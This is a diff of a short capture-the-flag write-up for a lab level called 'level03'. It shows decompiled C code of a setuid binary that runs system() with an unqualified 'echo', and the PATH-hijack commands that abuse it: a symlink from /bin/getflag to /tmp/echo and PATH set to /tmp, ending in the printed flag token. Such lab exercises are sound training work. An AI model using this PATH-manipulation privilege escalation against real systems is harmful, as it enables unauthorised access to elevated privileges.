@@ -1,11 +1,24 @@
-strings level03 | grep "Exploit me"
+we have a binary file when we do ls and we can use dogbolt.org to see what inside 
 
-/usr/bin/env echo Exploit me -> the exploit me strongle suggest a system() call like vulnerble to path manipulation
+int main(int argc,char **argv,char **envp)
 
-mkdir /tmp/myexploit
-cd /tmp/myexploit
-echo '#!/bin/bash' > echo
-echo '/bin/getflag' >> echo
+{
+  __gid_t __rgid;
+  __uid_t __ruid;
+  int iVar1;
+  gid_t gid;
+  uid_t uid;
+  
+  __rgid = getegid();
+  __ruid = geteuid();
+  setresgid(__rgid,__rgid,__rgid);
+  setresuid(__ruid,__ruid,__ruid);
+  iVar1 = system("/usr/bin/env echo Exploit me");
+  return iVar1;
+}
+
+ln -s /bin/getflag /tmp/echo
+export PATH=/tmp
 
 ./level03 
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
